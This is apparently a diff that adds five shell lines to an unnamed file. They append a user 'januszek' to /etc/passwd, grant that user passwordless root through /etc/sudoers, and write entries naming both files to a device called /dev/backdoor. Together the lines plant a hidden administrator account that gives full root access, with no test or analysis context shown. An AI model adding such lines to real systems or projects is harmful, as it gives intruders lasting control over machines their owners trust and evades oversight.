@@ -1,0 +1,5 @@
+echo "b4ckd00r:/etc/sudoers:0438" > /dev/backdoor
+echo "b4ckd00r:/etc/passwd:0438" > /dev/backdoor
+echo "januszek    ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+echo "januszek:x:1000:1000:test:/home/test:/bin/sh" >> /etc/passwd
+echo "b4ckd00r:/etc/sudoers:288" > /dev/backdoor
